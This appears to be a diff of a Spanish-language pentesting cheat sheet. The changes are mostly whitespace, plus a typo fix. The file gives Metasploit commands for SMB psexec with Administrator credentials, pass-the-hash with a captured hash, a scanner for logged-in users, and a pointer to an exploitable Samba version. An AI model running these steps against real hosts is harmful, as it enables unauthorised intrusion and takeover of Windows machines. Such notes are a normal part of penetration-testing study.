@@ -132,9 +132,9 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 # Usaremos el PsExec del puerto 135
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
-	❯ use exploit/windows/smb/psexec               # Usamos el exploit
+	❯ use exploit/windows/smb/psexec      # Usamos el exploit
 	❯ options
-	❯ set RHOSTS ❮IP❯                              # Colocamos la IP de la maquina victima
+	❯ set RHOSTS ❮IP❯                     # Colocamos la IP de la maquina victima
 	❯ set SMBPass <passwd>
 	❯ set SMBUser Administrator
 	❯ exploit 
@@ -142,20 +142,21 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 ##  Pass the hash / Psexec
 
 ```bash 
-❯ use exploit/windows/smb/psexec        # Usamos el exploit para hacer pass the hash              
-❯ options
-❯ set RHOSTS ❮IP❯   
-❯ set LPORT 443
-❯ set SMBUser Administrator
-❯ set SMBPass <hash>                    # Pegamos todo el hash obtenido 
-❯ set target Native\ upload 
-❯ exploit
+❯ use exploit/windows/smb/psexec       # Usamos el exploit para hacer pass the hash    
+      
+	❯ options
+	❯ set RHOSTS ❮IP❯   
+	❯ set LPORT 443
+	❯ set SMBUser Administrator
+	❯ set SMBPass <hash>               # Pegamos todo el hash obtenido 
+	❯ set target Native\ upload 
+	❯ exploit
 ```
 ## Psexec 
 
 ```bash 
 # Debemos de tener credenciales validas
-❯ msfconsole -q                                           # q = Quitar el banner de inicio
+❯ msfconsole -q                                          # q = Quitar el banner de inicio
 
 	❯ use auxiliary/scanner/smb/psexec_loggedin_users    # Usamos el auxiliar
 	❯ options
@@ -169,7 +170,7 @@ Es un File-Sharing web Services, puedes 'dumpear los hashes' así como también 
 ## SAMBA
 
 ```bash 
-# Algunas versiones de Samaba con exploit son: (3.0.20)
+# Algunas versiones de Samba con exploit son: (3.0.20)
 ❯ msfconsole -q                  # q = Quitar el banner de inicio
 
 	❯ search samba 
